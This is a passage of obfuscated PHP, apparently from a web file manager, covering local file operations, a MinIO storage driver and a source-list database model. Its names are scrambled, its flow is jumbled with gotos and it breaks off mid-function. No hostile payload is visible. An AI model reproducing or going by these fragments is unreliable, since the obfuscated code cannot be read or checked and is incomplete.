$this->iconvTo($FˆÚÄ‰¨õÕ, $config[$BµÈ‡¼Îõ[1222]], $config[$BµÈ‡¼Îõ[1223]]); } public function getPathOuter($Eùöø´Æõœ) { goto eˆ¶©ÒÚ‡Û; a¬á¥÷»Œ: if (substr($DÑØÅÀ¸óÚ, 0, 2) == $D…ìîŒÃåØ[1225]) { $DÑØÅÀ¸óÚ = BASIC_PATH . substr($DÑØÅÀ¸óÚ, 2); } if (substr($Eùöø´Æõœ, 0, 2) == $D…ìîŒÃåØ[1225]) { $Eùöø´Æõœ = BASIC_PATH . substr($Eùöø´Æõœ, 2); } $DÑØÅÀ¸óÚ = KodIO::clear($DÑØÅÀ¸óÚ); goto cºÇ¥ğò«Í; eˆ¶©ÒÚ‡Û: $D…ìîŒÃåØ =& $_SERVER[ÉóçÄÇ]; $DÑØÅÀ¸óÚ = $this->iconvApp($this->pathBase); $Eùöø´Æõœ = $this->iconvApp($Eùöø´Æõœ); goto a¬á¥÷»Œ; cºÇ¥ğò«Í: $Eùöø´Æõœ = KodIO::clear($Eùöø´Æõœ); $Eùöø´Æõœ = substr($Eùöø´Æõœ, strlen($DÑØÅÀ¸óÚ)); if (empty($this->pathDriver)) { return $Eùöø´Æõœ; } goto aŸ¼‡ö¾À; aŸ¼‡ö¾À: return $this->pathDriver . $D…ìîŒÃåØ[8] . ltrim($Eùöø´Æõœ, $D…ìîŒÃåØ[8]); goto BĞñ©Ó÷ó´; BĞñ©Ó÷ó´: } public function mkfile($b¶Ç§¹åå÷, $c™­Œù–õ = '', $b¼‚½Ûï¦¦ = REPEAT_RENAME) { $b¶Ç§¹åå÷ = $this->iconvSystem($b¶Ç§¹åå÷); @touch($b¶Ç§¹åå÷); if ($c™­Œù–õ) { file_put_contents($b¶Ç§¹åå÷, $c™­Œù–õ); } return is_file($b¶Ç§¹åå÷) ? $this->getPathOuter($b¶Ç§¹åå÷) : !1; } public function mkdir($dÈÄÃô«Ã®, $c¼Øí¯Æå = REPEAT_SKIP) { $dÈÄÃô«Ã® = $this->iconvSystem($dÈÄÃô«Ã®); if (is_dir($dÈÄÃô«Ã®)) { return $this->getPathOuter($dÈÄÃô«Ã®); } @mkdir($dÈÄÃô«Ã®, 511, !0); return is_dir($dÈÄÃô«Ã®) ? $this->getPathOuter($dÈÄÃô«Ã®) : !1; } public function copyFile($D‹¦¹ëŒğä, $c­³é©Öï) { $this->mkdir($this->pathFather($c­³é©Öï)); $D‹¦¹ëŒğä = $this->iconvSystem($D‹¦¹ëŒğä); $c­³é©Öï = $this->iconvSystem($c­³é©Öï); $BòÌ­»Æ×Ì = copy_64($D‹¦¹ëŒğä, $c­³é©Öï); return $BòÌ­»Æ×Ì ? $this->getPathOuter($c­³é©Öï) : !1; } public function moveFile($fÅÖ¹íÃ¸, $Cõ†¨ö‡à¢) { $this->mkdir($this->pathFather($Cõ†¨ö‡à¢)); $fÅÖ¹íÃ¸ = $this->iconvSystem($fÅÖ¹íÃ¸); $Cõ†¨ö‡à¢ = $this->iconvSystem($Cõ†¨ö‡à¢); $E÷àÃë…× = intval(@rename($fÅÖ¹íÃ¸, $Cõ†¨ö‡à¢)); if (!$E÷àÃë…×) { if ($E÷àÃë…× = intval(@copy_64($fÅÖ¹íÃ¸, $Cõ†¨ö‡à¢))) { @unlink($fÅÖ¹íÃ¸); } } return $E÷àÃë…× ? $this->getPathOuter($Cõ†¨ö‡à¢) : !1; } public function delFile($EÔ™í¥Š´İ) { $EÔ™í¥Š´İ = $this->iconvSystem($EÔ™í¥Š´İ); if (!@unlink($EÔ™í¥Š´İ)) { @chmod($EÔ™í¥Š´İ, 511); if (!@unlink($EÔ™í¥Š´İ)) { return !1; } } else { return !0; } } public function delFolder($eŒšá¢«óÔ) { goto A¤¯ä–¶¢¶; dÇÍ¨äÒó: if (!($E’¨ŒÕ£¾ƒ = opendir($eŒšá¢«óÔ))) { return !1; } while (($A–ÎéÀ™Ö = readdir($E’¨ŒÕ£¾ƒ)) !== !1) { if ($A–ÎéÀ™Ö == $a–Ÿßê¾¬ó[94] || $A–ÎéÀ™Ö == $a–Ÿßê¾¬ó[1232]) { continue; } $Cï±ĞíÕÁ = $eŒšá¢«óÔ . $a–Ÿßê¾¬ó[8] . $A–ÎéÀ™Ö; if (is_file($Cï±ĞíÕÁ) || is_link($Cï±ĞíÕÁ)) { if (!unlink($Cï±ĞíÕÁ)) { chmod($Cï±ĞíÕÁ, 511); if (!unlink($Cï±ĞíÕÁ)) { return !1; } } } else { if (is_dir($Cï±ĞíÕÁ)) { chmod($Cï±ĞíÕÁ, 511); $Cï±ĞíÕÁ = $this->iconvApp($Cï±ĞíÕÁ); if (!$this->delFolder($Cï±ĞíÕÁ)) { return !1; } } } } closedir($E’¨ŒÕ£¾ƒ); goto c¶ª£Œ¶©µ; c¶ª£Œ¶©µ: return rmdir($eŒšá¢«óÔ); goto a”‹œÆš ; A¤¯ä–¶¢¶: $a–Ÿßê¾¬ó =& $_SERVER[ÉóçÄÇ]; $eŒšá¢«óÔ = $this->iconvSystem($eŒšá¢«óÔ); if (!is_dir($eŒšá¢«óÔ)) { return !0; } goto dÇÍ¨äÒó; a”‹œÆš : } public function rename($fòğÑƒ§×, $d‰½º÷·º„) { goto cÇ†‡…çô; c×­´¨Ñì: $fòğÑƒ§× = $this->iconvSystem($fòğÑƒ§×); $DÃ¹Àİ“‚ = $this->pathFather($fòğÑƒ§×); $D”òéÑùÕ = rtrim($DÃ¹Àİ“‚, $eÀõ¯‹îÃ¡[8]) . $eÀõ¯‹îÃ¡[8] . $cù¿‚ïÕé; goto Aˆ¡ªô‡‡; cÇ†‡…çô: $eÀõ¯‹îÃ¡ =& $_SERVER[ÉóçÄÇ]; $cù¿‚ïÕé = $this->fileNameAuto($this->pathFather($fòğÑƒ§×), $d‰½º÷·º„); $cù¿‚ïÕé = $this->iconvSystem($cù¿‚ïÕé); goto c×­´¨Ñì; Aˆ¡ªô‡‡: $F¨Ñ®¬‹« = @rename($fòğÑƒ§×, $D”òéÑùÕ); $D”òéÑùÕ = $this->iconvApp($D”òéÑùÕ); return $F¨Ñ®¬‹« ? $this->getPathOuter($D”òéÑùÕ) : !1; goto EğĞİõ¬¬Õ; EğĞİõ¬¬Õ: } public function size($f§Ó—õßŠ) { $f§Ó—õßŠ = $this->iconvSystem($f§Ó—õßŠ); return filesize_64($f§Ó—õßŠ); } public function info($C¿Ã£Œ²é÷) { $C¿Ã£Œ²é÷ = $this->iconvSystem($C¿Ã£Œ²é÷); if ($this->isFolder($C¿Ã£Œ²é÷)) { return $this->folderInfo($C¿Ã£Œ²é÷); } else { if ($this->isFile($C¿Ã£Œ²é÷)) { return $this->fileInfo($C¿Ã£Œ²é÷); } } return !1; } protected function infoChildren($eÇ‰é¯†—î, &$DªÍ¹²Ÿ™, $aŞìŠËÛ‡ = true) { goto D‡ÓÖïŠä; c“ë–§ØÆ¥: closedir($d›ï©õ÷›»); goto FŞ¸Ó¢ß¯®; DŸˆ°°”–: if ($aŞìŠËÛ‡) { $eÇ‰é¯†—î = $this->iconvSystem($eÇ‰é¯†—î); } if (!($d›ï©õ÷›» = @opendir($eÇ‰é¯†—î))) { return; } while (($E‰¬ŒÊù“Ÿ = readdir($d›ï©õ÷›»)) !== !1) { if ($E‰¬ŒÊù“Ÿ == $B¼éáÅ×ñ[94] || $E‰¬ŒÊù“Ÿ == $B¼éáÅ×ñ[1232]) { continue; } $BæÇË‰¹ğñ = $eÇ‰é¯†—î . $E‰¬ŒÊù“Ÿ; if (is_file($BæÇË‰¹ğñ) || is_link($BæÇË‰¹ğñ)) { $DªÍ¹²Ÿ™[$B¼éáÅ×ñ[78]]++; $DªÍ¹²Ÿ™[$B¼éáÅ×ñ[77]] += filesize_64($BæÇË‰¹ğñ); } else { if (is_dir($BæÇË‰¹ğñ)) { $DªÍ¹²Ÿ™[$B¼éáÅ×ñ[79]]++; $this->infoChildren($BæÇË‰¹ğñ, $DªÍ¹²Ÿ™, !1); } } } goto c“ë–§ØÆ¥; D‡ÓÖïŠä: $B¼éáÅ×ñ =& $_SERVER[ÉóçÄÇ]; check_abort_echo(); $eÇ‰é¯†—î = rtrim($eÇ‰é¯†—î, $B¼éáÅ×ñ[8]) . $B¼éáÅ×ñ[8]; goto DŸˆ°°”–; FŞ¸Ó¢ß¯®: } private function folderInfo($cÁÖ¡ä‡Öá, $fˆš¿”‹Ò = false) { $c†³Ôµ²Ø =& $_SERVER[ÉóçÄÇ]; $cÁÖ¡ä‡Öá = rtrim($cÁÖ¡ä‡Öá, $c†³Ôµ²Ø[8]) . $c†³Ôµ²Ø[8]; $C°Ë „äêº = $this->iconvApp($this->pathThis($cÁÖ¡ä‡Öá)); if ($fˆš¿”‹Ò) { return array($c†³Ôµ²Ø[28] => $C°Ë „äêº, $c†³Ôµ²Ø[75] => $this->getPathOuter($cÁÖ¡ä‡Öá), $c†³Ôµ²Ø[29] => $c†³Ôµ²Ø[76]); } $E°‘éªÌ¾ª = array($c†³Ôµ²Ø[28] => $C°Ë „äêº, $c†³Ôµ²Ø[75] => $this->getPathOuter($cÁÖ¡ä‡Öá), $c†³Ôµ²Ø[29] => $c†³Ôµ²Ø[76], $c†³Ôµ²Ø[192] => @filectime($cÁÖ¡ä‡Öá), $c†³Ôµ²Ø[83] => @filemtime($cÁÖ¡ä‡Öá), $c†³Ôµ²Ø[1235] => @fileatime($cÁÖ¡ä‡Öá), $c†³Ôµ²Ø[1236] => is_readable($cÁÖ¡ä‡Öá), $c†³Ôµ²Ø[1237] => is_writable($cÁÖ¡ä‡Öá), $c†³Ôµ²Ø[1238] => get_mode($cÁÖ¡ä‡Öá)); return $E°‘éªÌ¾ª; } private function fileInfo($a»ŒäØ½ÚŞ, $D¼Ÿ˜º‚ˆ = false) { $fÓÈ¸ß©ë =& $_SERVER[ÉóçÄÇ]; $CÚôà¨Æ×µ = $this->iconvApp($this->pathThis($a»ŒäØ½ÚŞ)); if ($D¼Ÿ˜º‚ˆ) { return array($fÓÈ¸ß©ë[28] => $CÚôà¨Æ×µ, $fÓÈ¸ß©ë[75] => $this->getPathOuter($a»ŒäØ½ÚŞ), $fÓÈ¸ß©ë[29] => $fÓÈ¸ß©ë[173], $fÓÈ¸ß©ë[77] => $this->size($a»ŒäØ½ÚŞ), $fÓÈ¸ß©ë[167] => $this->ext($CÚôà¨Æ×µ)); } $c‘‰šÖ“‡µ = array($fÓÈ¸ß©ë[28] => $CÚôà¨Æ×µ, $fÓÈ¸ß©ë[75] => $this->getPathOuter($a»ŒäØ½ÚŞ), $fÓÈ¸ß©ë[29] => $fÓÈ¸ß©ë[173], $fÓÈ¸ß©ë[192] => @filectime($a»ŒäØ½ÚŞ), $fÓÈ¸ß©ë[83] => @filemtime($a»ŒäØ½ÚŞ), $fÓÈ¸ß©ë[1235] => @fileatime($a»ŒäØ½ÚŞ), $fÓÈ¸ß©ë[77] => $this->size($a»ŒäØ½ÚŞ), $fÓÈ¸ß©ë[167] => $this->ext($CÚôà¨Æ×µ), $fÓÈ¸ß©ë[1236] => is_readable($a»ŒäØ½ÚŞ), $fÓÈ¸ß©ë[1237] => is_writable($a»ŒäØ½ÚŞ), $fÓÈ¸ß©ë[1238] => get_mode($a»ŒäØ½ÚŞ)); return $c‘‰šÖ“‡µ; } public function exist($FÜÁ¼–¼Ô) { $FÜÁ¼–¼Ô = $this->iconvSystem($FÜÁ¼–¼Ô); return @file_exists($FÜÁ¼–¼Ô); } public function isFile($EœŒ®ó¥­ë) { $EœŒ®ó¥­ë = $this->iconvSystem($EœŒ®ó¥­ë); return @is_file($EœŒ®ó¥­ë); } public function isFolder($d¥Ú‚Èİ‹) { $d¥Ú‚Èİ‹ = $this->iconvSystem($d¥Ú‚Èİ‹); return @is_dir($d¥Ú‚Èİ‹); } public function listPath($b×“«ß‘ßå, $b£¡éÛæÛ = false) { goto fÆóíŠéÌ; Bìô»õÏ´¿: $fíŠœÂªÁ = array($eÎ±œÇÈæõ[74] => array(), $eÎ±œÇÈæõ[73] => array()); if (!($a¯¥»¬­­‚ = @opendir($b×“«ß‘ßå))) { return $fíŠœÂªÁ; } while (($b² Ôßç¡Ñ = readdir($a¯¥»¬­­‚)) !== !1) { if ($b² Ôßç¡Ñ == $eÎ±œÇÈæõ[94] || $b² Ôßç¡Ñ == $eÎ±œÇÈæõ[1232]) { continue; } $a©‹²íèçä = $b×“«ß‘ßå . $b² Ôßç¡Ñ; if (is_file($a©‹²íèçä)) { $fíŠœÂªÁ[$eÎ±œÇÈæõ[73]][] = $this->fileInfo($a©‹²íèçä, $b£¡éÛæÛ); } else { $fíŠœÂªÁ[$eÎ±œÇÈæõ[74]][] = $this->folderInfo($a©‹²íèçä, $b£¡éÛæÛ); } } goto có“´¬Ïœš; fÆóíŠéÌ: $eÎ±œÇÈæõ =& $_SERVER[ÉóçÄÇ]; $b×“«ß‘ßå = $this->iconvSystem($b×“«ß‘ßå); $b×“«ß‘ßå = rtrim($b×“«ß‘ßå, $eÎ±œÇÈæõ[8]) . $eÎ±œÇÈæõ[8]; goto Bìô»õÏ´¿; có“´¬Ïœš: closedir($a¯¥»¬­­‚); return $fíŠœÂªÁ; goto CØİÌó‰š‘; CØİÌó‰š‘: } public function listAll($Eˆá¨ß„ƒ®, &$d—Í›Ë¯ = array()) { goto c–¢Ü” îñ; Eâ•‘“ç…: if (!($DÇ“¯—Šï = @opendir($Eˆá¨ß„ƒ®))) { return $d—Í›Ë¯; } while (($F¡›©çº¾¯ = readdir($DÇ“¯—Šï)) !== !1) { if ($F¡›©çº¾¯ == $B®Ëº‡©‡ë[94] || $F¡›©çº¾¯ == $B®Ëº‡©‡ë[1232]) { continue; } $e¸øï–ß× = $Eˆá¨ß„ƒ® . $F¡›©çº¾¯; if (is_dir($e¸øï–ß×) && !is_link($e¸øï–ß×)) { $d—Í›Ë¯[] = array($B®Ëº‡©‡ë[75] => $e¸øï–ß× . $B®Ëº‡©‡ë[8], $B®Ëº‡©‡ë[76] => 1, $B®Ëº‡©‡ë[83] => @filemtime($e¸øï–ß×), $B®Ëº‡©‡ë[77] => 0); $this->listAll($e¸øï–ß×, $d—Í›Ë¯); } else { $d—Í›Ë¯[] = array($B®Ëº‡©‡ë[75] => $e¸øï–ß×, $B®Ëº‡©‡ë[76] => 0, $B®Ëº‡©‡ë[83] => @filemtime($e¸øï–ß×), $B®Ëº‡©‡ë[77] => $this->size($e¸øï–ß×)); } } closedir($DÇ“¯—Šï); goto EÑèÒº†¤; EÑèÒº†¤: return $d—Í›Ë¯; goto FËÔĞğ£ ; c–¢Ü” îñ: $B®Ëº‡©‡ë =& $_SERVER[ÉóçÄÇ]; $Eˆá¨ß„ƒ® = $this->iconvSystem($Eˆá¨ß„ƒ®); $Eˆá¨ß„ƒ® = rtrim($Eˆá¨ß„ƒ®, $B®Ëº‡©‡ë[8]) . $B®Ëº‡©‡ë[8]; goto Eâ•‘“ç…; FËÔĞğ£ : } public function has($b­ëì”ï, $dÙè´İºÊ¯ = false, $A¯ø”ôÂ•Ó = true) { goto DÏ‡¼Ï“›; d²İšÙ‹´: if (!($dÌìÖÂ¤‘š = @opendir($b­ëì”ï))) { return !1; } $fÓÄË¬Ó„ö = 0; $eï½Ö°Ò = 0; goto F”«õ²Õ«ö; E†¯ˆõÔ½ï: if ($dÙè´İºÊ¯) { return array($EµçÎ½™ [201] => $fÓÄË¬Ó„ö, $EµçÎ½™ [202] => $eï½Ö°Ò); } return !1; goto eì¹¾‘ø; F”«õ²Õ«ö: $F‘²·¹‹¦È = 0; while (($B¼Í´õ¶à = readdir($dÌìÖÂ¤‘š)) !== !1) { if ($B¼Í´õ¶à == $EµçÎ½™ [94] || $B¼Í´õ¶à == $EµçÎ½™ [1232]) { continue; } $bÙô»ËÚÃà = $b­ëì”ï . $B¼Í´õ¶à; if ($dÙè´İºÊ¯) { $F‘²·¹‹¦È++; if (@is_file($bÙô»ËÚÃà)) { $fÓÄË¬Ó„ö++; } else { $eï½Ö°Ò++; } if ($F‘²·¹‹¦È > 10000) { break; } continue; } if ($A¯ø”ôÂ•Ó) { if (@is_file($bÙô»ËÚÃà)) { return !0; } } else { if (@is_dir($bÙô»ËÚÃà . $EµçÎ½™ [8])) { return !0; } } } closedir($dÌìÖÂ¤‘š); goto E†¯ˆõÔ½ï; DÏ‡¼Ï“›: $EµçÎ½™  =& $_SERVER[ÉóçÄÇ]; $b­ëì”ï = $this->iconvSystem($b­ëì”ï); $b­ëì”ï = rtrim($b­ëì”ï, $EµçÎ½™ [8]) . $EµçÎ½™ [8]; goto d²İšÙ‹´; eì¹¾‘ø: } public function hashSimple($CÖ…¾æ´óÉ) { goto bğÈøÊªù˜; AšÍ‰ö²àƒ: return md5($E²ÂŠ‹ÒÅˆ) . $C×ÅêË¦“Å; goto EÛ÷ Øé¤ê; B‰æã”õÕ¯: $C×ÅêË¦“Å = $this->size($CÖ…¾æ´óÉ); $d¶ÀÁ÷š” = 200; $c‘„ÌÅ­“· = 50; goto e¿ŸĞã®óí; bğÈøÊªù˜: $dŠôÔ Øå =& $_SERVER[ÉóçÄÇ]; if (!$CÖ…¾æ´óÉ) { return md5($dŠôÔ Øå[33]); } $CÖ…¾æ´óÉ = $this->iconvSystem($CÖ…¾æ´óÉ); goto B‰æã”õÕ¯; e¿ŸĞã®óí: if ($C×ÅêË¦“Å <= $d¶ÀÁ÷š” * $c‘„ÌÅ­“·) { return $this->hashMd5($CÖ…¾æ´óÉ) . $C×ÅêË¦“Å; } $E²ÂŠ‹ÒÅˆ = $dŠôÔ Øå[33]; $a¾¼¦¼ĞÉ« = intval($C×ÅêË¦“Å / $c‘„ÌÅ­“·); goto bàóìëö‰; EÛÔè£ÃìØ: fseek_64($B´¿÷Àª„ˆ, $C×ÅêË¦“Å - $d¶ÀÁ÷š”); $E²ÂŠ‹ÒÅˆ .= fread($B´¿÷Àª„ˆ, $d¶ÀÁ÷š”); fclose($B´¿÷Àª„ˆ); goto AšÍ‰ö²àƒ; bàóìëö‰: $B´¿÷Àª„ˆ = fopen($CÖ…¾æ´óÉ, $dŠôÔ Øå[1239]); if (!$B´¿÷Àª„ˆ) { return $E²ÂŠ‹ÒÅˆ; } for ($DÕ«ÑÏ§µÒ = 0; $DÕ«ÑÏ§µÒ < $c‘„ÌÅ­“·; $DÕ«ÑÏ§µÒ++) { fseek_64($B´¿÷Àª„ˆ, $a¾¼¦¼ĞÉ« * $DÕ«ÑÏ§µÒ); $E²ÂŠ‹ÒÅˆ .= fread($B´¿÷Àª„ˆ, $d¶ÀÁ÷š”); } goto EÛÔè£ÃìØ; EÛ÷ Øé¤ê: } public function getContent($aŠ™ÑµÚÒ˜) { $aŠ™ÑµÚÒ˜ = $this->iconvSystem($aŠ™ÑµÚÒ˜); return file_get_contents($aŠ™ÑµÚÒ˜); } public function setContent($côïÒ­ÌŒ², $EƒØÂéå = '') { $côïÒ­ÌŒ² = $this->iconvSystem($côïÒ­ÌŒ²); $eÖ·ÖóŸæ = @file_put_contents($côïÒ­ÌŒ², $EƒØÂéå, LOCK_EX); clearstatcache(); return $eÖ·ÖóŸæ === !1 ? !1 : !0; } public function fileSubstr($eÛ¨·“Şñ, $Bô¸„¢ø¡ˆ = 0, $D ˜Ô½ß‚ƒ = false) { goto cÀ‚›÷–; d¹¾îº’Ò¥: fseek_64($B¶ç¦§àÏã, $Bô¸„¢ø¡ˆ); $dé×«â…¾ = fread($B¶ç¦§àÏã, $D ˜Ô½ß‚ƒ); fclose($B¶ç¦§àÏã); goto bŸ²…œ¿…; bÏ¼­ÅéÍ : if ($D ˜Ô½ß‚ƒ <= 0) { return $Aª‹ç„‰Êæ[33]; } $B¶ç¦§àÏã = fopen($eÛ¨·“Şñ, $Aª‹ç„‰Êæ[1239]); if (!$B¶ç¦§àÏã) { return !1; } goto d¹¾îº’Ò¥; cÀ‚›÷–: $Aª‹ç„‰Êæ =& $_SERVER[ÉóçÄÇ]; $eÛ¨·“Şñ = $this->iconvSystem($eÛ¨·“Şñ); if ($D ˜Ô½ß‚ƒ === !1) { $D ˜Ô½ß‚ƒ = $this->size($eÛ¨·“Şñ); } goto bÏ¼­ÅéÍ ; bŸ²…œ¿…: return $dé×«â…¾; goto bŒ—•Ò¹×›; bŒ—•Ò¹×›: } public function upload($cğóôöÙ, $Fö‚‰ƒÑÏ„, $CƒßÁÕï»ó = false, $Cî§Å‘øë— = REPEAT_REPLACE) { $E±§è­ñ° = $this->copyFile($Fö‚‰ƒÑÏ„, $cğóôöÙ); return $E±§è­ñ° ? $this->getPathOuter($cğóôöÙ) : !1; } public function setModifyTime($bŸ³…İÑ İ, $eÜîßğ¿îä = '') { @touch($bŸ³…İÑ İ, intval($eÜîßğ¿îä)); } public function download($CÇÏ›â¼ñ, $bƒÚñ«”ñ) { return $this->iconvSystem($CÇÏ›â¼ñ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Aè‰¯Œ—‡Œ) { parent::__construct($Aè‰¯Œ—‡Œ); $this->signatureVersion($_SERVER[ÉóçÄÇ][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto aìÅÜº¯’‘; B‘ÇÌÌ·¢Ä: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\162\143\145"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\x61\155\145" => "\x69\157\137\163\x6f\x75\x72\x63\145\x5f\155\x65\164\x61", "\155\x65\164\x61\x46\x69\x65\x6c\x64" => "\163\157\x75\162\143\145\x49\104"); protected $dataAuto = array(array("\x6d\157\144\151\146\x79\124\151\155\145", "\164\151\x6d\x65", "\151\x6e\x73\145\x72\x74", "\x66\x75\x6e\x63\164\x69\x6f\x6e"), array("\143\x72\145\141\x74\x65\124\x69\155\145", "\x74\151\155\x65", "\x69\156\163\x65\x72\x74", "\146\x75\x6e\x63\x74\151\x6f\x6e"), array("\x76\151\x65\167\124\151\155\x65", "\164\151\155\145", "\151\156\x73\145\x72\164", "\x66\165\156\x63\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($c¸—…¨ÎĞ£) { return $this->listSource(array($_SERVER[ÉóçÄÇ][389] => $c¸—…¨ÎĞ£)); } public function typeName($F³ê¶„Öğ) { static $EÜ®–«ôõ  = array(self::TYPE_SYSTEM => "\x73\171\163\164\x65\x6d", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\147\162\x6f\165\x70"); return $EÜ®–«ôõ [$F³ê¶„Öğ . $_SERVER[ÉóçÄÇ][33]]; } public function sourceListInfo($e®„¬º‹‹ƒ, $fœ×”Ëí = false) { goto dÌš‚•ÒêŠ; dÌš‚•ÒêŠ: $EµŒ¦øÕÊ =& $_SERVER[ÉóçÄÇ]; $e®„¬º‹‹ƒ = $e®„¬º‹‹ƒ ? $e®„¬º‹‹ƒ : array(); $e®„¬º‹‹ƒ = array_filter(array_unique($e®„¬º‹‹ƒ)); goto d©§ŒœÛÎ·; d©§ŒœÛÎ·: if (!$e®„¬º‹‹ƒ) { return array(); } $AŒĞÓ†âÑÛ = $this->where(array($EµŒ¦øÕÊ[390] => array($EµŒ¦øÕÊ[7], $e®„¬º‹‹ƒ)))->select(); $this->_listDataApply($AŒĞÓ†âÑÛ, $fœ×”Ëí); goto Fôºà†‹÷Ğ; Fôºà†‹÷Ğ: return array_to_keyvalue($AŒĞÓ†âÑÛ, $EµŒ¦øÕÊ[390]); goto fïñ§­Ş í; fïñ§­Ş í: } public function pathInfoFilter(&$EøÀäğÇ«Ï) { goto Dï’Îğ—§; AñæøÍñêø: if (!$Dß®óª¤Ø) { goto F©ôï®Êõİ; E±íÀ½åË: $b’‡ïÜ±ÔÏ = array(); foreach ($Dß®óª¤Ø as $bÉ¥½ğÃ) { if (in_array($bÉ¥½ğÃ, $C¡§¾‹‚Ó)) { continue; } $b’‡ïÜ±ÔÏ[] = $bÉ¥½ğÃ; } goto EæÀ¿Ò³•ó; bãÈ½©†Ì: $D¢ô¯Û–­š = $bŠñ¶šÀ ç[394]; $C¡§¾‹‚Ó = explode($bŠñ¶šÀ ç[47], $D¢ô¯Û–­š); $Dß®óª¤Ø = explode($bŠñ¶šÀ ç[47], $E‚‹º®õ¿); goto E±íÀ½åË; F©ôï®Êõİ: $E‚‹º®õ¿ = $bŠñ¶šÀ ç[391]; $E‚‹º®õ¿ .= $bŠñ¶šÀ ç[392]; $E‚‹º®õ¿ .= $bŠñ¶šÀ ç[393]; goto bãÈ½©†Ì; EæÀ¿Ò³•ó: } $EøÀäğÇ«Ï[$bŠñ¶šÀ ç[75]] = $bŠñ¶šÀ ç[395] . $EøÀäğÇ«Ï[$bŠñ¶šÀ ç[390]] . $bŠñ¶šÀ ç[396]; $EøÀäğÇ«Ï[$bŠñ¶šÀ ç[29]] = $EøÀäğÇ«Ï[$bŠñ¶šÀ ç[397]] == 1 ? $bŠñ¶šÀ ç[76] : $bŠñ¶šÀ ç[173]; goto Cö¸Œë¸­­; DÓ„Ù™´âœ: if (isset($EøÀäğÇ«Ï[$bŠñ¶šÀ ç[400]]) && $EøÀäğÇ«Ï[$bŠñ¶šÀ ç[400]][$bŠñ¶šÀ ç[401]] == -1) { $a¨«„Œ’µ” = $b’‡ïÜ±ÔÏ; } $EøÀäğÇ«Ï = array_field_key($EøÀäğÇ«Ï, $a¨«„Œ’µ”); return $EøÀäğÇ«Ï; goto aˆ—Ö¬ìÊ; Dï’Îğ—§: $bŠñ¶šÀ ç =& $_SERVER[ÉóçÄÇ]; static $Dß®óª¤Ø = false; static $b’‡ïÜ±ÔÏ = false; goto AñæøÍñêø; Cö¸Œë¸­­: $EøÀäğÇ«Ï[$bŠñ¶šÀ ç[398]] = $this->typeName($EøÀäğÇ«Ï[$bŠñ¶šÀ ç[398]]); if ($EøÀäğÇ«Ï[$bŠñ¶šÀ ç[397]] != 1) { $EøÀäğÇ«Ï[$bŠñ¶šÀ ç[167]] = $EøÀäğÇ«Ï[$bŠñ¶šÀ ç[399]]; unset($EøÀäğÇ«Ï[$bŠñ¶šÀ ç[399]]); } $a¨«„Œ’µ” = $Dß®óª¤Ø; goto DÓ„Ù™´âœ; aˆ—Ö¬ìÊ: } public function listUserFav() { goto eŒÊ¿ÑˆßÓ; e„¤ÍÛÈ‚ƒ: foreach ($AŒ®æõÄğ as &$BßŒ“ íï») { $BßŒ“ íï» = array($B­°”Íè²Ä[406] => $BßŒ“ íï»[$B­°”Íè²Ä[388]], $B­°”Íè²Ä[407] => $BßŒ“ íï»[$B­°”Íè²Ä[28]], $B­°”Íè²Ä[408] => $BßŒ“ íï»[$B­°”Íè²Ä[75]], $B­°”Íè²Ä[409] => $BßŒ“ íï»[$B­°”Íè²Ä[29]], $B­°”Íè²Ä[410] => $BßŒ“ íï»[$B­°”Íè²Ä[192]], $B­°”Íè²Ä[411] => $BßŒ“ íï»[$B­°”Íè²Ä[83]]); if ($BßŒ“ íï»[$B­°”Íè²Ä[29]] == $B­°”Íè²Ä[403] && $cÙó…«¾®„[$BßŒ“ íï»[$B­°”Íè²Ä[75]]]) { $BßŒ“ íï»[$B­°”Íè²Ä[84]] = $cÙó…«¾®„[$BßŒ“ íï»[$B­°”Íè²Ä[75]]]; } } unset($BßŒ“ íï»); return $AŒ®æõÄğ; goto F“¹Êğ; B­¡®ó¼¬÷: $fãƒÀË–‡ñ = array_to_keyvalue($fãƒÀË–‡ñ, $B­°”Íè²Ä[33], $B­°”Íè²Ä[75]); if ($fãƒÀË–‡ñ) { $cÙó…«¾®„ = $this->listSource(array($B­°”Íè²Ä[404] => array($B­°”Íè²Ä[405], $fãƒÀË–‡ñ))); } $cÙó…«¾®„ = array_to_keyvalue($cÙó…«¾®„[$B­°”Íè²Ä[365]], $B­°”Íè²Ä[390]); goto e„¤ÍÛÈ‚ƒ; eŒÊ¿ÑˆßÓ: $B­°”Íè²Ä =& $_SERVER[ÉóçÄÇ]; $AŒ®æõÄğ = Model($B­°”Íè²Ä[402])->listData(); $fãƒÀË–‡ñ = array_filter_by_field($AŒ®æõÄğ, $B­°”Íè²Ä[29], $B­°”Íè²Ä[403]); goto B­¡®ó¼¬÷; F“¹Êğ: } public function listUserTag($b®òø¬Âˆ«) { goto c“•ñëÖä; BÑ›‹ˆ¦ : if (!$cÕé²ÔÊˆ || count($båµØ‰Ûƒ) == $cÕé²ÔÊˆ[$Aƒß¼‡ÛÛ‘[362]][$Aƒß¼‡ÛÛ‘[363]]) { return $cÕé²ÔÊˆ; } $E°Ü½Ğåã¸ = array(); $D«œ¸¨ê‡– = array_to_keyvalue($cÕé²ÔÊˆ[$Aƒß¼‡ÛÛ‘[74]], $Aƒß¼‡ÛÛ‘[33], $Aƒß¼‡ÛÛ‘[390]); goto f­Ûá›¸Î; aíôĞ“¾‹: $A•ù»ïšì = array(); foreach ($BÚÄ³¶½Ë† as $BÊİµŠÃõ–) { $eÖâùô’í± = $BÊİµŠÃõ–[$Aƒß¼‡ÛÛ‘[75]]; if (!$eÖâùô’í±) { continue; } if (!isset($A•ù»ïšì[$eÖâùô’í±])) { $A•ù»ïšì[$eÖâùô’í±] = array(); } $A•ù»ïšì[$eÖâùô’í±][] = $BÊİµŠÃõ–[$Aƒß¼‡ÛÛ‘[413]]; } $båµØ‰Ûƒ = array(); goto CËÑï‰³Ù³; E„²ˆ¾É‡š: if ($E°Ü½Ğåã¸) { Model($Aƒß¼‡ÛÛ‘[414])->removeBySource($E°Ü½Ğåã¸); } return $cÕé²ÔÊˆ; goto CøæÇ•ø‡ì; 